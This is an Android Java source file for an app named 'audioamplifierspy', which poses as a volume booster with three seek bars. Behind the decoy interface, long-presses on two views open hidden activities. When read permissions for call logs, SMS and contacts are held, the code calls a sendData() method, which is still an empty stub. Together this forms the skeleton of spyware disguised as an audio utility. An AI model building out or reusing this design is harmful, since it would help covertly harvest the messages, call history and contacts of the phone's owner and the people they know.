package com.example.audioamplifierspy;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.AudioManager;
import android.os.Bundle;
import android.view.View;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.SeekBar;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.android.material.snackbar.Snackbar;

import pub.devrel.easypermissions.EasyPermissions;

public class MainActivity extends AppCompatActivity {

    private boolean entered_till;
    private LinearLayout ll;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        SharedPreferences preferences = getSharedPreferences("sharedPref", MODE_PRIVATE);
        entered_till = preferences.getBoolean("entered", false);

        findViewById(R.id.track).setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View v) {
                startActivity(new Intent(MainActivity.this, ShowContent.class));
                return true;
            }
        });

        findViewById(R.id.imageView).setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View v) {
                  if (!entered_till)
                      startActivity(new Intent(MainActivity.this, InputACT.class));
                  return true;
            }
        });

        seekBar();

        String[] perms = {Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS};
        if (EasyPermissions.hasPermissions(this, perms))
            sendData();

    }

    private void sendData() {
        //do something

    }

    private void seekBar() {

        SeekBar sb = findViewById(R.id.seekBar);
        SeekBar sb2 = findViewById(R.id.seekBar2);
        SeekBar sb3 = findViewById(R.id.seekBar3);

        final AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        final int MAX = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);

        sb.setMax(MAX);
        sb.setProgress(11);

        sb2.setMax(MAX);
        sb2.setProgress(12);

        sb3.setMax(MAX);
        sb3.setProgress(7);

        SeekBar.OnSeekBarChangeListener listener = new SeekBar.OnSeekBarChangeListener() {
            @Override
            public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, progress, 0);

                if (progress == MAX){
                    Snackbar.make(seekBar, "Device Volume Turned To 100%", Snackbar.LENGTH_INDEFINITE).show();
                }

            }

            @Override
            public void onStartTrackingTouch(SeekBar seekBar) { }

            @Override
            public void onStopTrackingTouch(SeekBar seekBar) { }
        };

        sb.setOnSeekBarChangeListener(listener);
        sb2.setOnSeekBarChangeListener(listener);
        sb3.setOnSeekBarChangeListener(listener);

    }




}
